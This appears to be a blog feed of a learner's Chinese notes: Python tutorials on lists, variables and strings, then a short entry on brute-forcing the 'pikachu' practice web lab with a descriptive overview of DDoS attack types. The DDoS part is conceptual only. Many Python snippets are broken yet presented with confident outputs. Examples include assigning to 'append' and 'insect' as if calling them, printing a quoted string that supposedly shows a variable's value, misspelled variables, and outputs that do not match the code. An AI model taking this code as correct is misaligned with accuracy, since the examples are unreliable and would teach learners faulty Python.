        <content type="html"><![CDATA[<h6 id="列表是什么？"><a href="#列表是什么？" class="headerlink" title="列表是什么？"></a>列表是什么？</h6><p>列表由一些列按照特定顺序排列而成的元素。</p><p>在Python中，由[]表示列表，并用“，”分隔开其中的元素</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bicycle = [&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;]</span><br><span class="line">print(bicycle)</span><br></pre></td></tr></table></figure><p>这样的话会打印</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;]</span><br></pre></td></tr></table></figure><p>没错，他会连着【】一块打印下来，没想到吧</p><h6 id="访问列表元素"><a href="#访问列表元素" class="headerlink" title="访问列表元素"></a>访问列表元素</h6><p>列表式有序集合，所以要访问列表式只需要将该元素的索引告诉Python就好。</p><p>例如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bicycle = [&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;]</span><br><span class="line">print(bicycle[0])</span><br></pre></td></tr></table></figure><p>当你请求访问列表元素时，Python只会返回该元素，而不包括【】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">trek</span><br></pre></td></tr></table></figure><p>当然你也可以使用之前学习过的方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bicycle = [&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;]</span><br><span class="line">print(bicycle[0].title())</span><br></pre></td></tr></table></figure><p>这样的话会输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Trek</span><br></pre></td></tr></table></figure><p>值得一提的是</p><p>索引是从0开始而并不是1开始</p><p>在Python中，第一个列表元素的索引为0而不是1.(这一点 就跟C语言的数组那块一样，都是从0开始的)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bicycle = [&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;]</span><br><span class="line">print(bicycle[1])</span><br><span class="line">print(bicycle[2])</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cannondale</span><br><span class="line">redline</span><br></pre></td></tr></table></figure><p>当你想要倒过来访问列表的时候，Python会提供给你一种特殊的语法。通过将索引定位为-1，可让Python返回最后一个列表元素：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bicycle = [&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;]</span><br><span class="line">print(bicycle[-1])</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redline</span><br></pre></td></tr></table></figure><h5 id="修改添加和删除元素"><a href="#修改添加和删除元素" class="headerlink" title="修改添加和删除元素"></a>修改添加和删除元素</h5><h6 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h6><p>很简单，用索引定位就好</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bicycle = [&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;]</span><br><span class="line">print(bicycle)</span><br><span class="line">bicycle[0] = &#x27;baba&#x27;</span><br><span class="line">print(bicycle)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;]</span><br><span class="line">[&#x27;baba&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;]</span><br></pre></td></tr></table></figure><h6 id="添加"><a href="#添加" class="headerlink" title="添加"></a>添加</h6><p>在列表未添加元素</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.append</span><br></pre></td></tr></table></figure><p>这是一个很神奇的东西，他可以让你在列表的末尾添加元素</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bicycle = [&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;]</span><br><span class="line">print(bicycle)</span><br><span class="line">bicycle.append = (&#x27;ca&#x27;)</span><br><span class="line">print(bicycle)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;</span><br><span class="line">&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;&#x27;ca&#x27;</span><br></pre></td></tr></table></figure><p>当然，如果你足够闲得无聊，你也来可以尝试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">name = []</span><br><span class="line">name.append=(&#x27;zgh&#x27;)</span><br><span class="line">nmae.append=(&#x27;cjy&#x27;)</span><br><span class="line">nmae.append=(&#x27;czm&#x27;)</span><br><span class="line">nmae.append=(&#x27;dyf&#x27;)</span><br><span class="line">nmae.append=(&#x27;czh&#x27;)</span><br><span class="line">print(name)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;cgh&#x27;,&#x27;cjy&#x27;,&#x27;czm&#x27;,&#x27;dlf&#x27;,&#x27;czh&#x27;]</span><br></pre></td></tr></table></figure><p>有了在末尾添加当然就有在中间添加了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bicycle = [&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;]</span><br><span class="line">print(bicycle)</span><br><span class="line">bicycle.insect = (1,&#x27;ca&#x27;)</span><br><span class="line">print(bicycle)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;</span><br><span class="line">&#x27;trek&#x27;,&#x27;ca&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;</span><br></pre></td></tr></table></figure><h6 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bicycle = [&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;]</span><br><span class="line">print(bicycle)</span><br><span class="line">del bicycle[0]</span><br><span class="line">print(bicycle)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;</span><br><span class="line">&#x27;cannondale&#x27;,&#x27;redline&#x27;</span><br></pre></td></tr></table></figure><p>使用del可以无线删除，当然，前提是你知道这个元素在Python中的索引值</p><h6 id="当然你也可以使用方法pop-删除"><a href="#当然你也可以使用方法pop-删除" class="headerlink" title="当然你也可以使用方法pop()删除"></a>当然你也可以使用方法pop()删除</h6><p>（我感觉这个列表就像一个栈，pop使用就像弹出这个栈顶）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bicycle = [&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;]</span><br><span class="line">print(bicycle)</span><br><span class="line">outdate = bicycle.pop()</span><br><span class="line">print(bicycle)</span><br><span class="line">print(outdate)</span><br><span class="line">（这一块本来我打算用popped的，但@一般路过小辉夜给了更好的建议，所以就用outdata了）</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;</span><br><span class="line">‘trek’&#x27;cannondale&#x27;</span><br><span class="line">&#x27;redline&#x27;</span><br></pre></td></tr></table></figure><h6 id="弹出任何位置的元素"><a href="#弹出任何位置的元素" class="headerlink" title="弹出任何位置的元素"></a>弹出任何位置的元素</h6><p>其实吧，pop这个东西不知能删除最后一个元素，你只要在括号里面填写你想要的元素的索引，他都能给你弹出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bicycle = [&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;]</span><br><span class="line">print(bicycle)</span><br><span class="line">outdate = bicycle.pop(1)</span><br><span class="line">print(bicycle)</span><br><span class="line">print(outdate)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;</span><br><span class="line">&#x27;trek,&#x27;redline&#x27;</span><br><span class="line">&#x27;cannondale&#x27;</span><br></pre></td></tr></table></figure><p>需要注意的是，当你弹出元素的时候，这个元素就不在列表中了</p><p>根据特定的值删除</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bicycle = [&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;]</span><br><span class="line">print(bicycle)</span><br><span class="line">bicycle.remove(&#x27;cannondale&#x27;)</span><br><span class="line">print(bicycle)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;]</span><br><span class="line">[&#x27;trek&#x27;,redline&#x27;]</span><br></pre></td></tr></table></figure><p>使用remove的时候也可以照常使用这个值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bicycle = [&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;]</span><br><span class="line">print(bicycle)</span><br><span class="line">abb = &#x27;cannondale&#x27;</span><br><span class="line">bicycle.remove(&#x27;cannondale&#x27;)</span><br><span class="line">print(f&quot;&#123;abb.title()&#125;&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;trek&#x27;, &#x27;cannondale&#x27;, &#x27;redline&#x27;]</span><br><span class="line">Cannondale</span><br></pre></td></tr></table></figure><h6 id="组织列表"><a href="#组织列表" class="headerlink" title="组织列表"></a>组织列表</h6><p>sort（）</p><h6 id="使用sort（）可以将列表进行用就行排序（这个是按照字母进行排序的）"><a href="#使用sort（）可以将列表进行用就行排序（这个是按照字母进行排序的）" class="headerlink" title="使用sort（）可以将列表进行用就行排序（这个是按照字母进行排序的）"></a>使用sort（）可以将列表进行用就行排序（这个是按照字母进行排序的）</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bicycle = [&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;]</span><br><span class="line">bicycle.sort()</span><br><span class="line">print(bicycle)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;cannondale&#x27;,&#x27;redline&#x27;,&#x27;trek&#x27;]</span><br></pre></td></tr></table></figure><p>当你要逆字母方向时，需要</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bicycle = [&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;]</span><br><span class="line">bicycle.sort(reverse = True)</span><br><span class="line">print(bicycle)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;trek&#x27;, &#x27;redline&#x27;, &#x27;cannondale&#x27;]</span><br></pre></td></tr></table></figure><h6 id="使用sorted函数进行临时性的排序"><a href="#使用sorted函数进行临时性的排序" class="headerlink" title="使用sorted函数进行临时性的排序"></a>使用sorted函数进行临时性的排序</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bicycle = [&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;]</span><br><span class="line">print(bicycle)</span><br><span class="line">print(sorted(bicycle))</span><br><span class="line">print(bicycle)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;trek&#x27;, &#x27;cannondale&#x27;, &#x27;redline&#x27;]</span><br><span class="line">[&#x27;cannondale&#x27;, &#x27;redline&#x27;, &#x27;trek&#x27;]</span><br><span class="line">[&#x27;trek&#x27;, &#x27;cannondale&#x27;, &#x27;redline&#x27;]</span><br></pre></td></tr></table></figure><h6 id="倒着打印列表"><a href="#倒着打印列表" class="headerlink" title="倒着打印列表"></a>倒着打印列表</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bicycle = [&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;]</span><br><span class="line">print(bicycle)</span><br><span class="line">bicycle.reverse()</span><br><span class="line">print(bicycle)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;trek&#x27;, &#x27;cannondale&#x27;, &#x27;redline&#x27;]</span><br><span class="line">[&#x27;redline&#x27;, &#x27;cannondale&#x27;, &#x27;trek&#x27;]</span><br></pre></td></tr></table></figure><h6 id="确定列表长度"><a href="#确定列表长度" class="headerlink" title="确定列表长度"></a>确定列表长度</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;bicycle = [&#x27;trek&#x27;,&#x27;cannondale&#x27;,&#x27;redline&#x27;]</span><br><span class="line">&gt;&gt;&gt;len(bicycle)</span><br><span class="line">3</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> knowledge </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python:从入门到入土---变量和基本数据类型</title>
      <link href="/2025/01/08/2023%E5%B9%B43%E6%9C%8819%E6%97%A5-Python-%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F-%E5%8F%98%E9%87%8F%E5%92%8C%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"/>
      <url>/2025/01/08/2023%E5%B9%B43%E6%9C%8819%E6%97%A5-Python-%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F-%E5%8F%98%E9%87%8F%E5%92%8C%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h6 id="第一个python代码"><a href="#第一个python代码" class="headerlink" title="第一个python代码"></a>第一个python代码</h6><p>无疑是永远の<br>    ·Hello,world<br>与C语言不同の是，python使用の是print而非printf,其次，python中不需要像C语言那样频繁地输入;结束，Python中换行即是结束语句<br>运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(&quot;Hello,world&quot;)</span><br></pre></td></tr></table></figure><p>输出の结果就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello,world</span><br></pre></td></tr></table></figure><p>当然你也可以选择设置一个变量来指向“Hello,world”这个值<br>比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">message=&quot;Hello,world&quot;</span><br><span class="line">print(&quot;message&quot;)</span><br></pre></td></tr></table></figure><p>运行这个程序就会输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello,world</span><br></pre></td></tr></table></figure><p>下面来拓展这个程序：使得message指向另外一个值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">·message = hello world</span><br><span class="line">·print(&quot;message&quot;)</span><br><span class="line">·message = goodbye world</span><br><span class="line"> ·print(&quot;message&quot;)</span><br></pre></td></tr></table></figure><p>这样の话就会打印输出两行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hello world</span><br><span class="line">goodbye world</span><br></pre></td></tr></table></figure><p>在程序中可以随时修改变量の值，但是python将始终记录变相の最新值</p><h6 id="变量的使用和命名原则"><a href="#变量的使用和命名原则" class="headerlink" title="变量的使用和命名原则"></a>变量的使用和命名原则</h6><p>变量的使用，需要遵循一些原则</p><blockquote><p>变量名只能包含数字，下划线，字母。变量名只能以字母或者下划线打头，但不能以数字打头。</p><p>例如：</p><p>你可以以message_1为变量名，但是你不可以以1_message为变量名</p><p>变量名不可以是空格，需要用到的时候以下划线来分割其中的单词</p><p>例如：</p><p>message_1是可以的，但是message 1是不可行的</p><p>有些Python关键字和函数名是不鞥用作变量名的，查询的话是使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import keyword</span><br><span class="line">print(keyword.kwlist)</span><br><span class="line">print(len(keyword.kwlist))</span><br></pre></td></tr></table></figure></blockquote><h6 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h6><p>字符串就是一连串的字符。在Pyhthon中，用括号括起来的都是字符串，</p><p>“this is a string”</p><p>‘this is also a string’</p><h6 id="方法：Python对数据进行的操作"><a href="#方法：Python对数据进行的操作" class="headerlink" title="方法：Python对数据进行的操作"></a>方法：Python对数据进行的操作</h6><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name = &quot;anaconda&quot;</span><br><span class="line">print(name.title())</span><br></pre></td></tr></table></figure><p>这个语句的输出就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">anaconda</span><br></pre></td></tr></table></figure><p>其中title()就是方法，而name后面的.就是让Pyhon对变量name执行方法title（）指定的操作</p><p>方法title()已首字母大写的方式显示每个单词，即将每个单词的首字母都大写（所以叫title标题么）</p><p>此外还有几个大小写处理方法</p><p>.upper()全字母大写</p><p>.lower()全字母小写</p><p>在字符串中使用变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">first_name = &quot;ada&quot;</span><br><span class="line">lase_name = &quot;lovelace&quot;</span><br><span class="line">full_name = f&quot;&#123;first_name&#125;&#123;last_name&#125;&quot;</span><br><span class="line">print(full_name)</span><br></pre></td></tr></table></figure><p>要在字符串中插入变量的值，可在牵引号前加入字母f，再将要插入的变量放在花括号内。这种字符串称之为f（format）字符串</p><p>上述代码输出结果如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ada lovelace</span><br></pre></td></tr></table></figure><p>比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">first_name = &quot;ada&quot;</span><br><span class="line">lase_name = &quot;lovelace&quot;</span><br><span class="line">full_name = f&quot;&#123;first_name&#125;&#123;last_name&#125;&quot;</span><br><span class="line">print(f&quot;hello,&#123;full_name.title()&#125;!&quot;)</span><br></pre></td></tr></table></figure><p>上述语句会变成一段友好的问候</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello,Ada Lovelace!</span><br></pre></td></tr></table></figure><p>当然，还可以将整个这一段赋值给一个变量，zheyangdehuazuihouzaiprint调用的话时候会简单很多</p><h6 id="制表符或者换行符来添加空白"><a href="#制表符或者换行符来添加空白" class="headerlink" title="制表符或者换行符来添加空白"></a>制表符或者换行符来添加空白</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">print(&quot;language:\n\ttPyhton\n\tC\n\tJavaScript&quot;)</span><br><span class="line">输出结果如下</span><br><span class="line">language:</span><br><span class="line">Python</span><br><span class="line">C</span><br><span class="line">JavaScript</span><br></pre></td></tr></table></figure><h6 id="删除空白"><a href="#删除空白" class="headerlink" title="删除空白"></a>删除空白</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;favorite_language = &quot;Pyhotn &quot;</span><br><span class="line">&gt;&gt;&gt;favorite_language</span><br><span class="line">”python “</span><br><span class="line">&gt;&gt;&gt;favorite_language = &quot;Pyhotn &quot;</span><br><span class="line">&gt;&gt;&gt;favorite_language.rstrip()</span><br><span class="line">”python“</span><br></pre></td></tr></table></figure><p>但是这种删除只是短暂的，当你再次访问这个favorite_language的变量的值的时候，可看见末尾的空格。</p><p>要永久的删除这个地方的空白，就要将删除操作的结果关联到变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;favorite_language = &quot;Pyhotn &quot;</span><br><span class="line">&gt;&gt;&gt;favorite_language = favorite_language.rstrip()</span><br><span class="line">&gt;&gt;&gt;favorite_language</span><br><span class="line">&quot;python&quot;</span><br></pre></td></tr></table></figure><p>当然，你还可以删除开头的空白</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;favorite_language = &quot; Pyhotn &quot;</span><br><span class="line">》》》favorite_language.lstrip()</span><br><span class="line">&quot;Python &quot;</span><br></pre></td></tr></table></figure><h6 id="使用字符串的时候要避免语法错误"><a href="#使用字符串的时候要避免语法错误" class="headerlink" title="使用字符串的时候要避免语法错误"></a>使用字符串的时候要避免语法错误</h6><p>比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">message = &#x27;Python&#x27;s strength is its diverse community&#x27;</span><br></pre></td></tr></table></figure><p>这是一个错误的，单引号之内不能有单引号，但是双引号可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">message = “Python&#x27;s strength is its diverse community”</span><br></pre></td></tr></table></figure><p>整数Int浮点数float也和C语言一样，这里就不多说了</p><p>有一点，整数不管怎么和浮点数运算，结果永远是浮点数。</p><p>书写很大的整数的时候，可以用_来进行分割，当你打印这种使用下划线定义的数的时候，Python不会打印其中的下划线</p><h6 id="同时给过个变量赋值"><a href="#同时给过个变量赋值" class="headerlink" title="同时给过个变量赋值"></a>同时给过个变量赋值</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x,y,z=0,1,2</span><br></pre></td></tr></table></figure><p>这样的话x=0,y=1,z=2</p><p>同时复制的话记得中间用,隔开就行</p><p>在python中，要指出特定的变量为常亮可已将其全部大写，方便辨认。</p><h6 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h6><h1 id="跟C语言的-一样性质"><a href="#跟C语言的-一样性质" class="headerlink" title="跟C语言的/一样性质"></a>跟C语言的/一样性质</h1>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> knowledge </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pikachu---爆破</title>
      <link href="/2025/01/08/2023%E5%B9%B43%E6%9C%8819%E6%97%A5-pikachu-%E7%88%86%E7%A0%B4/"/>
      <url>/2025/01/08/2023%E5%B9%B43%E6%9C%8819%E6%97%A5-pikachu-%E7%88%86%E7%A0%B4/</url>
      
        <content type="html"><![CDATA[<p><a href="https://note.youdao.com/s/AmDlcdeg">https://note.youdao.com/s/AmDlcdeg</a></p><p>pikachu验证码绕过</p><p><a href="https://note.youdao.com/s/cCN1K9ys">https://note.youdao.com/s/cCN1K9ys</a></p><p>pikachu验证码绕过（on cilent）</p><p><a href="https://note.youdao.com/s/DSGjveVc">https://note.youdao.com/s/DSGjveVc</a></p><p>pikachu中token防爆破</p><h3 id="Web登录防爆破的原理和实现"><a href="#Web登录防爆破的原理和实现" class="headerlink" title="Web登录防爆破的原理和实现"></a>Web登录防爆破的原理和实现</h3><p><a href="https://www.cnblogs.com/cx59244405/p/10410746.html">https://www.cnblogs.com/cx59244405/p/10410746.html</a></p><h5 id="ddos攻击：一般指分布式拒绝服务攻击"><a href="#ddos攻击：一般指分布式拒绝服务攻击" class="headerlink" title="ddos攻击：一般指分布式拒绝服务攻击"></a>ddos攻击：一般指分布式拒绝服务攻击</h5><blockquote><p>一.基于自动化程序分类</p><p>1.手工的DDoS攻击：早期的DDoS攻击全是采用手动配置的，即发动DDoS攻击时，扫描远端有漏洞的计算机，侵入他们并安装代码</p><p>2.半自动化的DDoS攻击:攻击者使用自动化的Script来扫描，主控端的机器对主控端和代理端之间进行协商攻击的类型、受害者的地址、何时发起攻击等信息由进行详细记录。</p><p>3、自动化的DDoS攻击。</p><p>在这类攻击中。攻击者和代理端机器之间的通信是绝对不允许的。这类攻击的攻击阶段绝大部分被限制用一个单一的命令来实现，攻击的所有特征，例如攻击的类型，持续的时间和受害者的地址在攻击代码中都预先用程序实现。 [4] </p><p>二、基于系统及协议的弱点分类</p><p>1、洪水攻击。</p><p>在<a href="https://baike.baidu.com/item/洪水攻击/8826972?fromModule=lemma_inlink">洪水攻击</a>中。傀儡机向受害者系统发送大量的数据流为了充塞受害者系统的带宽，影响小的则降低受害者提供的服务，影响大的则使整个网络带宽持续饱和，以至于网络服务瘫痪。典型的洪水攻击有UDP洪水攻击和ICMP洪水攻击。 [4] </p><p>2、扩大攻击。</p><p>扩大攻击分为两种，一种是利用广播lP地址的特性，一种是利用反射体来发动攻击。前一种攻击者是利用了广播IP地址的特性来扩大和映射攻击，导致路由器将数据包发送到整个网络的广播地址列表中的所有的广播IP地址。这些恶意的流量将减少受害者系统可提供的带宽。典型的扩大攻击有Smurf和Fraggle攻击。 [4] 